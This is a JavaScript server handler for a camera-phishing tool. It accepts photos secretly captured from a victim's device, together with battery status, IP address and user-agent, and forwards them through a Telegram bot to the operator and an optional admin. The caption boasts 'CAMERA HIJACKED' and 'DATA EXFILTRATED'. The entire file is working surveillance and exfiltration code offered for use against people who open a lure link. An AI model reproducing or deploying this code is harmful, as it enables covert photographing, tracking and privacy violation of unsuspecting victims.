import formidable from "formidable";
import fs from "fs";
import { Telegraf } from "telegraf";

// ───────── CONFIG ─────────
export const config = { api: { bodyParser: false } };

// ───────── HANDLER ─────────
export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Method Not Allowed");

  const form = new formidable.IncomingForm({
    uploadDir: "/tmp",
    keepExtensions: true,
  });

  form.parse(req, async (err, fields, files) => {
    if (err) return res.status(500).send("Form parse error");

    const uid = fields.uid;
    const botParam = fields.bot; // لینک کې د بوت پارامتر

    if (!uid) return res.status(400).send("UID missing");
    if (!botParam) return res.status(400).send("Bot param missing");

    // ───────── BOT TOKEN FROM ENV ─────────
    const botTokens = {
      bot1: process.env.BOT1_TOKEN,
      bot2: process.env.BOT2_TOKEN,
      bot3: process.env.BOT3_TOKEN,
      bot4: process.env.BOT4_TOKEN,
    };

    const token = botTokens[botParam];
    if (!token) return res.status(400).send("Invalid bot token");

    const bot = new Telegraf(token);

    try {
      // ───────── DEVICE & NETWORK INFO ─────────
      const ip =
        req.headers["x-forwarded-for"] ||
        req.socket?.remoteAddress ||
        "Unknown";

      const device = req.headers["user-agent"] || "Unknown";

      const battery = fields.battery || "Unknown";
      const charging =
        fields.charging === "true"
          ? "Yes 🔌"
          : fields.charging === "false"
          ? "No 🔋"
          : "Unknown";

      const time = new Date().toLocaleString("en-US", {
        timeZone: "Asia/Kabul",
        hour12: false,
      });

      // ───────── CYBER-STYLE CAPTION ─────────
      const caption = `
<b>
╭───────────────⟢
│ ☠️ ᴄʏʙᴇʀ ʙʀᴇᴀᴄʜ sʏsᴛᴇᴍ ☠️
╰───────────────⟢

┋⬡ ▧ ᴛᴀʀɢᴇᴛ ʟᴏᴄᴋᴇᴅ
┋⬡ ▧ ᴜɪᴅ ─╶··◈ <code>${uid}</code>

─⟢ ▧ ᴘᴏᴡᴇʀ ─╶··◈ ${battery}%
─⟢ ▧ ᴄʜᴀʀɢɪɴɢ ─╶··◈ ${charging}

┋⬡ ▧ ɪᴘ ᴛʀᴀᴄᴇ ─╶··◈ ${ip}
┋⬡ ▧ ᴅᴇᴠɪᴄᴇ ─╶··◈ ${device}

─⟢ ▧ ᴛɪᴍᴇ ─╶··◈ ${time}

╭───────────────⟢
│ 📸 ᴄᴀᴍᴇʀᴀ ʜɪᴊᴀᴄᴋᴇᴅ
│ 🛰 ᴅᴀᴛᴀ ᴇxғɪʟᴛʀᴀᴛᴇᴅ
╰───────────────⟢

┋⬡ ─╶··◈ ʙᴜɪʟᴛ ʙʏ sᴛᴀʀx
</b>
`;

      // ───────── SEND 4 PHOTOS ─────────
      for (let i = 1; i <= 4; i++) {
        const file = files["photo" + i];
        if (!file) continue;

        const buffer = fs.readFileSync(file.filepath);

        // Send to user
        await bot.telegram.sendPhoto(uid, { source: buffer }, { caption, parse_mode: "HTML" });

        // Optional: send to admin
        if (process.env.ADMIN_ID) {
          await bot.telegram.sendPhoto(process.env.ADMIN_ID, { source: buffer }, { caption, parse_mode: "HTML" });
        }

        fs.unlinkSync(file.filepath);
      }

      res.status(200).send("✅ Photos sent with cyber caption");

    } catch (e) {
      console.error(e);
      res.status(500).send("❌ Telegram send failed");
    }
  });
} 
